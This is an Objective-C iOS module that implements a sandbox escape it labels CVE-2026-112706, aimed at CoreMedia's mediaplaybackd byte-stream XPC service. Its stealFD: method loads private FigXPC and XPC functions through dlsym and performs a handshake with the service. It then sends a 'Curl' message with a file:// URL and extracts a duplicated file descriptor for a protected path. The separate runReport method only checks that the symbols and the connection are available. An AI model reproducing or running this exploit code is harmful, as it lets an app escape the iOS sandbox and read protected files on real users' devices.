#import "KPFDLeakModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#import <dlfcn.h>
#import <xpc/xpc.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>
#include <dirent.h>

// FigXPC function pointers (loaded via dlsym)
static void *(*figXPCCreateBasicMessage)(uint32_t, void *);
static void (*figXPCMessageSetCFURL)(void *, const char *, void *);
static int (*figXPCMessageGetCFURL)(void *, const char *, void **);
static void (*figXPCConnectionSetMessageHandler)(void *, void *);
static void (*figXPCConnectionResume)(void *);
static void *(*figXPCConnectionCreateMachService)(const char *, void *, uint64_t);
static int (*figXPCMessageGetCFDictionary)(void *, const char *, void **);
static void (*figXPCMessageSetCFDictionary)(void *, const char *, void *);
static void (*figXPCMessageSetInt32)(void *, const char *, int32_t);
static int (*figXPCMessageGetInt32)(void *, const char *, int32_t *);
static int (*figXPCConnectionSendSyncMessage)(void *, void *, void **);

@interface KPFDLeakModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPFDLeakModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"fdleak112706";
        _title = @"CoreMedia fd leak (sandbox escape)";
        _subtitle = @"CVE-2026-112706: mediaplaybackd vends fds for protected paths";
        _icon = @"lock.open";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-fdleak-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[fdleak] %@", line];
}

- (BOOL)loadFigXPC {
    void *h = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_LAZY);
    if (!h) {
        [self journal:@"dlopen CoreMedia failed"];
        return NO;
    }

    // FigXPC functions from CoreMedia
    figXPCCreateBasicMessage = dlsym(h, "FigXPCCreateBasicMessage");
    figXPCMessageSetCFURL = dlsym(h, "FigXPCMessageSetCFURL");
    figXPCMessageGetCFDictionary = dlsym(h, "FigXPCMessageGetCFDictionary");

    // FigMemoryOrigin handshake functions
    static void *(*figMemOriginBegin)(void *, void *);
    static int (*figMemOriginComplete)(void *, void *);
    static void *(*figMemRecipientCreate)(void *, void *);
    figMemOriginBegin = dlsym(h, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
    figMemOriginComplete = dlsym(h, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");
    figMemRecipientCreate = dlsym(h, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");

    [self journal:[NSString stringWithFormat:@"FigXPCCreateBasicMessage: %p", figXPCCreateBasicMessage]];
    [self journal:[NSString stringWithFormat:@"FigXPCMessageSetCFURL: %p", figXPCMessageSetCFURL]];
    [self journal:[NSString stringWithFormat:@"FigMemoryOrigin*: %p %p %p", figMemOriginBegin, figMemOriginComplete, figMemRecipientCreate]];

    if (!figXPCCreateBasicMessage) {
        [self journal:@"FigXPCCreateBasicMessage not found"];
        return NO;
    }

    [self journal:@"FigXPC functions loaded"];
    return YES;
}

- (int)stealFD:(NSString *)filePath {
    // Load XPC functions via dlsym (not available on iOS at compile time)
    static xpc_connection_t (*my_xpc_conn_create)(const char *, void *, uint64_t) = NULL;
    static void (*my_xpc_conn_set_handler)(xpc_connection_t, void *) = NULL;
    static void (*my_xpc_conn_resume)(xpc_connection_t) = NULL;
    static void (*my_xpc_conn_cancel)(xpc_connection_t) = NULL;
    static void (*my_xpc_conn_send_reply)(xpc_connection_t, xpc_object_t, void *, void *) = NULL;
    static int (*my_xpc_dict_dup_fd)(xpc_object_t, const char *) = NULL;
    static xpc_object_t (*my_xpc_dict_get_value)(xpc_object_t, const char *) = NULL;

    if (!my_xpc_conn_create) {
        void *xpcLib = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
        if (!xpcLib) xpcLib = dlopen("/usr/lib/libxpc.dylib", RTLD_LAZY);
        my_xpc_conn_create = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_create_mach_service");
        my_xpc_conn_set_handler = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_set_event_handler");
        my_xpc_conn_resume = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_resume");
        my_xpc_conn_cancel = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_cancel");
        my_xpc_conn_send_reply = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_send_message_with_reply");
        my_xpc_dict_dup_fd = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_dictionary_dup_fd");
        my_xpc_dict_get_value = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_dictionary_get_value");
        [self journal:[NSString stringWithFormat:@"xpc funcs: %p %p %p", my_xpc_conn_create, my_xpc_conn_send_reply, my_xpc_dict_dup_fd]];
    }

    if (!my_xpc_conn_create || !my_xpc_conn_send_reply || !my_xpc_dict_dup_fd) {
        [self journal:@"XPC functions not available"];
        return -1;
    }

    xpc_connection_t conn = my_xpc_conn_create("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
    if (!conn) {
        [self journal:@"XPC connection failed"];
        return -1;
    }
    [self journal:@"XPC connection created"];
    my_xpc_conn_resume(conn);

    // Handshake
    for (NSString *opStr in @[@".rp1", @".rp2", @".org"]) {
        uint32_t opcode = 0;
        memcpy(&opcode, opStr.UTF8String, 4);
        void *msg = figXPCCreateBasicMessage(opcode, NULL);
        if (!msg) { [self journal:[NSString stringWithFormat:@"create %@ failed", opStr]]; continue; }
        __block xpc_object_t reply = NULL;
        my_xpc_conn_send_reply(conn, (__bridge xpc_object_t)msg, NULL, (__bridge void *)^(xpc_object_t r) { reply = r; });
        usleep(100000);
        [self journal:[NSString stringWithFormat:@"handshake %@: reply=%p", opStr, reply]];
    }

    // Curl create
    uint32_t curlOp = 'Curl';
    void *curlMsg = figXPCCreateBasicMessage(curlOp, NULL);
    if (!curlMsg) { [self journal:@"Curl msg failed"]; my_xpc_conn_cancel(conn); return -1; }

    NSString *urlStr = [NSString stringWithFormat:@"file://%@", filePath];
    CFURLRef url = CFURLCreateWithString(NULL, (__bridge CFStringRef)urlStr, NULL);
    figXPCMessageSetCFURL(curlMsg, "CreationURL", url);
    CFRelease(url);
    [self journal:[NSString stringWithFormat:@"Curl: %@", urlStr]];

    __block xpc_object_t curlReply = NULL;
    my_xpc_conn_send_reply(conn, (__bridge xpc_object_t)curlMsg, NULL, (__bridge void *)^(xpc_object_t r) { curlReply = r; });
    usleep(200000);

    if (!curlReply) {
        [self journal:@"Curl reply NULL"];
        my_xpc_conn_cancel(conn);
        return -1;
    }

    // Extract fd
    xpc_object_t details = my_xpc_dict_get_value(curlReply, "ByteStreamDetails");
    int fd = -1;
    if (details) {
        fd = my_xpc_dict_dup_fd(details, "FileDescriptor");
    } else {
        fd = my_xpc_dict_dup_fd(curlReply, "FileDescriptor");
    }
    [self journal:[NSString stringWithFormat:@"GOT FD: %d", fd]];
    my_xpc_conn_cancel(conn);
    return fd;
}
- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== FD Leak Recon (CVE-2026-112706) ===\n"];
    [report appendString:@"Phase 1: XPC + FigXPC availability check\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // Test 1: FigXPC function loading
    [report appendString:@"\n--- FigXPC symbols ---\n"];
    void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_LAZY);
    if (!cm) {
        [report appendString:@"CoreMedia: dlopen FAILED\n"];
    } else {
        [report appendString:@"CoreMedia: dlopen OK\n"];
        void *fn1 = dlsym(cm, "FigXPCCreateBasicMessage");
        void *fn2 = dlsym(cm, "FigXPCMessageSetCFURL");
        void *fn3 = dlsym(cm, "FigXPCConnectionCreateMachService");
        void *fn4 = dlsym(cm, "FigXPCConnectionSendSyncMessage");
        void *fn5 = dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
        [report appendFormat:@"  FigXPCCreateBasicMessage: %p\n", fn1];
        [report appendFormat:@"  FigXPCMessageSetCFURL: %p\n", fn2];
        [report appendFormat:@"  FigXPCConnectionCreateMachService: %p\n", fn3];
        [report appendFormat:@"  FigXPCConnectionSendSyncMessage: %p\n", fn4];
        [report appendFormat:@"  FigMemoryOrigin*: %p\n", fn5];
    }

    // Test 2: XPC function loading
    [report appendString:@"\n--- XPC symbols ---\n"];
    void *xpcLib = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
    if (!xpcLib) xpcLib = dlopen("/usr/lib/libxpc.dylib", RTLD_LAZY);
    if (!xpcLib) {
        [report appendString:@"libxpc: dlopen FAILED\n"];
    } else {
        [report appendString:@"libxpc: dlopen OK\n"];
        void *xf1 = dlsym(xpcLib, "xpc_connection_create_mach_service");
        void *xf2 = dlsym(xpcLib, "xpc_connection_send_message_with_reply");
        void *xf3 = dlsym(xpcLib, "xpc_dictionary_dup_fd");
        void *xf4 = dlsym(xpcLib, "xpc_connection_set_event_handler");
        void *xf5 = dlsym(xpcLib, "xpc_connection_resume");
        [report appendFormat:@"  xpc_connection_create_mach_service: %p\n", xf1];
        [report appendFormat:@"  xpc_connection_send_message_with_reply: %p\n", xf2];
        [report appendFormat:@"  xpc_dictionary_dup_fd: %p\n", xf3];
        [report appendFormat:@"  xpc_connection_set_event_handler: %p\n", xf4];
        [report appendFormat:@"  xpc_connection_resume: %p\n", xf5];
    }

    // Test 3: XPC connection attempt (minimal)
    [report appendString:@"\n--- XPC connection test ---\n"];
    if (xpcLib) {
        typedef void* (*xpc_create_t)(const char *, void *, uint64_t);
        typedef void (*xpc_fn_t)(void *);
        xpc_create_t xpc_create = dlsym(xpcLib, "xpc_connection_create_mach_service");
        xpc_fn_t xpc_resume = dlsym(xpcLib, "xpc_connection_resume");
        xpc_fn_t xpc_cancel = dlsym(xpcLib, "xpc_connection_cancel");

        if (xpc_create) {
            void *conn = xpc_create("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
            if (conn) {
                [report appendString:@"connection: CREATED\n"];
                if (xpc_resume) xpc_resume(conn);
                [report appendString:@"connection: RESUMED\n"];
                usleep(100000);
                if (xpc_cancel) xpc_cancel(conn);
                [report appendString:@"connection: CANCELLED (clean)\n"];
            } else {
                [report appendString:@"connection: FAILED (NULL)\n"];
            }
        }
    }

    // Verdict
    [report appendString:@"\n"];
    [report appendString:@"VERDICT: RECON_COMPLETE\n"];
    [report appendString:@"No fd stolen — this is availability check only.\n"];
    return report;
}

@end
